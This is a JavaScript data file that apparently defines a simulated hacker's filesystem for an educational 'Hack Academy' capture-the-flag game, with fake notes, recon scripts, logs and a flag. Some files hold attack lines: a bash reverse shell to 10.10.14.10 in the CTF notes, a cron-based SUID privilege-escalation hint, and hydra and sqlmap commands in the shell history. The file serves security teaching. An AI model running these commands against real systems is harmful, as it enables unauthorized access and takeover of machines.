export const FS_DIRS = {
  "/": ["/home", "/etc", "/var", "/usr", "/tmp", "/bin", "/opt"],
  "/home": ["/home/hacker"],
  "/home/hacker": ["/home/hacker/Desktop", "/home/hacker/tools", "/home/hacker/wordlists", "/home/hacker/.ssh", "notes.txt", ".bashrc", ".bash_history"],
  "/home/hacker/Desktop": ["ctf_notes.txt", "flag.txt", "targets.txt"],
  "/home/hacker/tools": ["nmap_scan.sh", "recon.py", "privesc_check.sh", "web_enum.sh"],
  "/home/hacker/wordlists": ["rockyou.txt", "common.txt", "subdomains.txt", "directories.txt"],
  "/home/hacker/.ssh": ["id_rsa", "id_rsa.pub", "known_hosts"],
  "/etc": ["passwd", "shadow", "hosts", "crontab", "os-release", "hostname"],
  "/var": ["/var/log", "/var/www"],
  "/var/log": ["auth.log", "syslog", "apache2.log"],
  "/var/www": ["/var/www/html"],
  "/var/www/html": ["index.php", "config.php", "login.php"],
  "/tmp": ["linpeas.sh", "pspy64", "payload.elf"],
  "/opt": ["/opt/tools"],
  "/opt/tools": ["burpsuite", "metasploit", "sqlmap"],
};

export const FS_FILES = {
  "notes.txt": `╔══════════════════════════════════════════╗
║     HACK ACADEMY — Hacker Notes          ║
╚══════════════════════════════════════════╝
Target Scope: 192.168.1.0/24
Methodology: Recon → Scan → Exploit → Post → Report

CHECKLIST:
[ ] Nmap full port scan
[ ] Service enumeration
[ ] Web directory brute force  
[ ] Check default credentials
[ ] Look for SQLi / XSS
[ ] PrivEsc enumeration (sudo -l, SUID)

RULE #1: ALWAYS get WRITTEN PERMISSION first!
RULE #2: Protect Bangladesh 🇧🇩 — don't destroy it!`,

  ".bashrc": `# ~/.bashrc — Hacker Config
export PS1='\\[\\e[32m\\]hacker@kali\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]$ '
alias ll='ls -la'
alias ports='netstat -tulpn'
alias myip='curl ifconfig.me'
alias update='apt update && apt upgrade -y'
alias recon='bash ~/tools/nmap_scan.sh'
alias privesc='bash ~/tools/privesc_check.sh'
export PATH=$PATH:/home/hacker/tools:/opt/tools
# Happy Ethical Hacking! Defend Bangladesh 🇧🇩`,

  ".bash_history": `nmap -sC -sV -oN scan.txt 10.10.10.3
nmap -p- --min-rate 5000 10.10.10.3
gobuster dir -u http://10.10.10.3 -w /usr/share/wordlists/dirb/common.txt
sqlmap -u "http://10.10.10.3/login?id=1" --dbs
hydra -l admin -P rockyou.txt ssh://10.10.10.3
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
./linpeas.sh
msfconsole`,

  "ctf_notes.txt": `=== CTF Quick Reference ===

INITIAL RECON:
  nmap -sC -sV -oN scan.txt <IP>
  nmap -p- --min-rate 5000 <IP>

WEB ENUM:
  gobuster dir -u http://<IP> -w common.txt -x php,html,txt
  nikto -h http://<IP>
  curl -I http://<IP>

PRIVESC:
  ./linpeas.sh
  sudo -l
  find / -perm -4000 2>/dev/null
  cat /etc/crontab

COMMON SHELLS:
  bash -i >& /dev/tcp/10.10.14.10/4444 0>&1
  python3 -c 'import pty;pty.spawn("/bin/bash")'`,

  "flag.txt": `🎉 Congratulations! You found the flag!

FLAG{y0u_4r3_4_r34l_3th1c4l_h4ck3r_d3f3nd_BD}

Keep learning. Keep practicing.
Serve your nation. Protect Bangladesh. 🇧🇩

"With great skill comes great responsibility."`,

  "targets.txt": `# Authorized Test Targets (Home Lab)
192.168.1.100  # Metasploitable2
192.168.1.101  # DVWA
192.168.1.102  # VulnHub — Mr. Robot
10.10.10.3     # HackTheBox — Lame
10.10.10.40    # HackTheBox — Legacy

# Legal Practice:
# TryHackMe.com | HackTheBox.com | VulnHub.com
# NEVER attack without authorization!`,

  "nmap_scan.sh": `#!/bin/bash
# Auto-Recon Script — HackAcademy
TARGET=$1
OUTPUT="recon_$(echo $TARGET | tr '.' '_')"
mkdir -p $OUTPUT

echo "[*] === HACK ACADEMY AUTO-RECON ==="
echo "[*] Target  : $TARGET"
echo "[*] Output  : $OUTPUT/"
echo "[*] Started : $(date)"
echo ""

echo "[*] Phase 1: Quick scan..."
nmap -sC -sV -oN $OUTPUT/quick.txt $TARGET

echo "[*] Phase 2: Full port scan..."
nmap -p- --min-rate 5000 -oN $OUTPUT/full.txt $TARGET

echo "[+] Done! Results saved to $OUTPUT/"`,

  "recon.py": `#!/usr/bin/env python3
# Python Recon Script — HackAcademy
import subprocess, sys, os

target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
print(f"[*] Target: {target}")
print("[*] Running recon...")
# Ping sweep
os.system(f"nmap -sn {target}/24 2>/dev/null")
print("[+] Recon complete!")`,

  "privesc_check.sh": `#!/bin/bash
# Quick PrivEsc Enumeration
echo "=== PRIVILEGE ESCALATION CHECKS ==="
echo "[*] Current user:"
id && whoami
echo "[*] Sudo rights:"
sudo -l 2>/dev/null
echo "[*] SUID binaries:"
find / -perm -4000 2>/dev/null
echo "[*] Writable crontab:"
ls -la /etc/crontab
echo "[*] Check GTFObins for any findings!"`,

  "passwd": `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
hacker:x:1000:1000:Hacker,,,:/home/hacker:/bin/bash
mysql:x:110:113:MySQL Server,,,:/var/lib/mysql:/bin/false`,

  "shadow": `[Permission Denied] — Need root access!
TRY: sudo cat /etc/shadow
  OR: find a privesc vector → become root → then read it
HINT: sudo -l (check your sudo privileges!)`,

  "hosts": `127.0.0.1   localhost
127.0.1.1   kali
::1         localhost ip6-localhost

# HTB Targets:
10.10.10.3   lame.htb
10.10.10.40  legacy.htb
10.10.10.75  bank.htb

# Local Lab:
192.168.1.100  metasploitable.lab
192.168.1.101  dvwa.lab`,

  "crontab": `# /etc/crontab — System cron jobs
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin

*/5 * * * * root    /tmp/backup.sh
0 */4 * * * www-data /var/www/cleanup.py
@reboot     root    /opt/startup.sh

# HINT: Is /tmp/backup.sh writable by you?
# If so: echo 'chmod +s /bin/bash' >> /tmp/backup.sh
# Wait 5 mins → /bin/bash -p → ROOT!`,

  "os-release": `NAME="Kali GNU/Linux"
VERSION="2024.1"
ID=kali
PRETTY_NAME="Kali GNU/Linux 2024.1"
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
# 600+ security tools pre-installed!`,

  "auth.log": `Apr 24 10:23:01 kali sshd[1234]: Failed password for root from 10.10.10.1 port 22 ssh2
Apr 24 10:23:15 kali sshd[1235]: Accepted publickey for hacker from 10.10.14.1
Apr 24 10:25:11 kali sudo: hacker : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
Apr 24 10:30:44 kali su[999]: Successful su for root by hacker
Apr 24 10:31:00 kali sshd[1300]: Failed password for admin from 192.168.1.50`,

  "apache2.log": `192.168.1.50 - - [24/Apr/2024] "GET /admin HTTP/1.1" 301 -
192.168.1.50 - - [24/Apr/2024] "GET /login.php?id=1' HTTP/1.1" 500 -
192.168.1.50 - - [24/Apr/2024] "POST /login.php HTTP/1.1" 200 -
192.168.1.50 - - [24/Apr/2024] "GET /../../../etc/passwd HTTP/1.1" 403 -
# These logs show SQLi and path traversal attempts!`,

  "linpeas.sh": `#!/bin/bash
# LinPEAS — Linux Privilege Escalation Awesome Script
# https://github.com/carlospolop/PEASS-ng
echo "╔══════╗"
echo "║ LinPEAS — Starting enumeration... ║"
echo "╚══════╝"
echo "[+] Checking sudo rights..."
sudo -l
echo "[+] Checking SUID binaries..."
find / -perm -4000 2>/dev/null
echo "[+] Checking cron jobs..."
cat /etc/crontab
echo "[+] Checking writable files..."
find / -writable -type f 2>/dev/null | head -20
echo "[+] Checking network info..."
ip addr; netstat -tulpn 2>/dev/null`,

  "id_rsa": `-----BEGIN OPENSSH PRIVATE KEY-----
[SIMULATED PRIVATE KEY — For educational demo only]
This is where SSH private keys live.
If found on a real target: use with ssh -i id_rsa user@target
PROTECT YOUR OWN KEYS: chmod 600 ~/.ssh/id_rsa
-----END OPENSSH PRIVATE KEY-----`,

  "rockyou.txt": `[Password Wordlist — rockyou.txt]
Total: 14,341,564 passwords
Top passwords:
123456
password
12345678
qwerty
letmein
password123
admin
hacker2024
...
Location: /usr/share/wordlists/rockyou.txt.gz (Kali)
Usage: hashcat -m 0 hash.txt rockyou.txt`,
};
